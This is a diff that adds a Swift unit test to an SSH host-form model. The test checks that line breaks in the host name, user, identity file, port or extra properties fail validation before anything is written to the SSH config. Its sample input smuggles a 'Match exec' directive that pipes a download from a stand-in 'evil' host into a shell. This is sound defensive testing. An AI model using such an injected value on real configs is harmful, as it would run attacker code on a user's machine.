@@ -126,3 +126,18 @@ private func form(_ name: String, host: String, _ rows: [CredentialRow]) -> Host
     #expect(p.upserts.first(where: { $0.properties.first("User") == "admin" })?.alias == "web-admin")
     #expect(p.upserts.allSatisfy { $0.groupName == "web" })
 }
+
+@Test func formRefusesLineBreaksInAnythingWrittenToConfig() {
+    let ok = CredentialRow(user: "root", port: "22", identityFile: "~/.ssh/id", extras: [])
+    #expect(HostFormModel(displayName: "Web", hostName: "1.2.3.4", rows: [ok]).validationError() == nil)
+    let injected = "x\nMatch exec \"curl evil|sh\""
+    let forms = [
+        HostFormModel(displayName: "Web", hostName: injected, rows: [ok]),
+        HostFormModel(displayName: "Web", hostName: "h", rows: [CredentialRow(user: injected, port: "", identityFile: "", extras: [])]),
+        HostFormModel(displayName: "Web", hostName: "h", rows: [CredentialRow(user: "u", port: "", identityFile: injected, extras: [])]),
+        HostFormModel(displayName: "Web", hostName: "h", rows: [CredentialRow(user: "u", port: "22\r", identityFile: "", extras: [])]),
+        HostFormModel(displayName: "Web", hostName: "h", rows: [CredentialRow(user: "u", port: "", identityFile: "",
+                                                                             extras: [SSHProperty(key: "LogLevel", values: [injected])])]),
+    ]
+    for form in forms { #expect(form.validationError() != nil) }
+}
